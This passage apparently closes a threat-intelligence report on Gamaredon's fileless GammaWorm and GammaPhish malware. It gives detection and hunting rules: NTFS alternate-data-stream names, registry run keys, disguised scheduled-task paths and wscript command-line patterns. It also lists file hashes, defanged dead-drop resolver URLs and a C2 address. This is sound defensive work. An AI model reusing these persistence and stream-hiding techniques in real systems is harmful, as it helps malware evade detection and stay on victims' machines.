Interestingly, while Gamaredon introduces novel capabilities, they also persistently recycle tactics. The group has been **using certain techniques for a long time** , such as embedding 1x1 tracking pixels to validate victim engagement, exploiting archive path traversal vulnerabilities, and weaponizing USB drives for physical propagation.

However, this campaign marks a significant technical step up over Gamaredon's previously documented attacks. The definitive transition to a nearly **entirely fileless, VBScript-driven "matryoshka" architecture,** combined with the heavy abuse of **NTFS Alternate Data Streams (ADS)** , demonstrates a concerted effort to bypass automated sandboxes, complicate forensic artifact recovery, and ultimately exhaust defenders.

By systematically weaponizing native Windows features alongside legitimate public infrastructure (such as Telegram and Cloudflare for Dead Drop Resolvers) Gamaredon now wields a hardened, industrial-scale toolset designed to **evade detection and maintain long-term espionage operations**. 

Sekoia.io’s TDR team will continue to track this campaign closely and enhance our detections of this intrusion set. Future reports in this series will delve into the next stages of the infection chain.

## Detection and hunting opportunities

Due to Gamaredon's rapid iteration cycle and complex persistence mechanisms, the safest remediation path for any host affected by this infection chain is a complete wipe. The malware's reliance on Dead Drop Resolvers (DDR) allows it to constantly download fresh payloads, meaning that cleaning attempts often result in fallback mechanisms restoring the malware.

For organizations looking to identify this activity or hunt for historical traces, we have detailed several behaviors across both host and network telemetries.

  * **GammaWorm killswitch:** GammaWorm creates a file-based lock by generating an Alternate Data Stream (ADS) at `%USERPROFILE%:save`. It populates this stream with hardcoded strings. If this ADS exists and is smaller than 100 bytes, GammaWorm terminates. However, if the file size exceeds 100 bytes, the propagation begins. If this ADS does not exist, the module reads `%USERPROFILE%\boot.ini` instead.
  * **Specific stream names:** hunt for the creation of `%USERPROFILE%:GTR`, `%USERPROFILE%:save`, `%USERPROFILE%:URL`, `%USERPROFILE%:LNK`, `%USERPROFILE%:SERVER`.
  * **Execution anomalies:** alert on command lines where native scripting engines (`wscript.exe`) target a path containing a colon (`:`) that is not immediately followed by a backslash (_e.g._ , `wscript.exe "C:\Users\[USER]:GTR"`).
  * **GammaWorm persistence:** monitor for the creation or modification of the specific registry run key used to launch GammaWorm copy upon user logon 
    * `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\ExplorerGuard`
  * **Scheduled tasks:** monitor the creation of the following three scheduled tasks, which are used to trigger the hidden ADS modules: 
    * `\DiskDiagnostic\Microsoft\Windows\DiskDiagnosticDataCollector`
    * `\CertificateServicesClient\SystemTask\SilentCleanup`
    * `\InstallService\ScanForUpdatesServer\SmartRetry`
  * **Registry keys:** look for the following keys within the `HKCU\Console\ registry` hive, used to store active C2 infrastructure: `WindowsUpdates`, `WindowsResponby`, `WindowsDetect`, `URLTeletype`, `WindowsTelegra`, `URLTelegra `and `IpURL`.
  * **Dead Drop Resolvers:** look for recurring, high-frequency outbound requests to specific DDR URLs `supabase[.]co`, `graph[.]org`, `workers[.]dev`, `teletype[.]in`, `telegra[.]ph` and `t[.]me` originating from non-browser processes like `wscript.exe` or a hidden PowerShell instance.



## IOCs

The file hashes below represent a subset of the hundreds of IOCs identified during this investigation. Complete IOCs list, including network indicators (IPs, C2 infrastructure, URLs and domains) is available via the [**Sekoia Intelligence feed**](https://app.sekoia.io/objects) and to **Sekoia Defend** customers.

We welcome peer-to-peer collaboration. If you are an analyst tracking this intrusion-set and wish to exchange data, please contact us at **tdr[at]sekoia.io**.

### GammaPhish

1794369214b7f62e70a0485e61335c61

### GammaWorm

8e1624d110c090ff57d4b493a9107c66

#### **Dead Drop Resolvers (DDR)**

hxxps://graph[.]org/kyjfkyr-12-06

hxxps://bold.zsjtn41091.workers[.]dev

hxxps://teletype[.]in/@myrain/Xh1Lta2Ccro

hxxps://quitethepastry[.]ru (operator controlled)

hxxps://telegra[.]ph/f8bfl6sp-01-02

hxxps:/t[.]me/s/teotori

hxxps://www.telegram[.]me/s/oberfarir

#### **C2**

104.194.140[.]6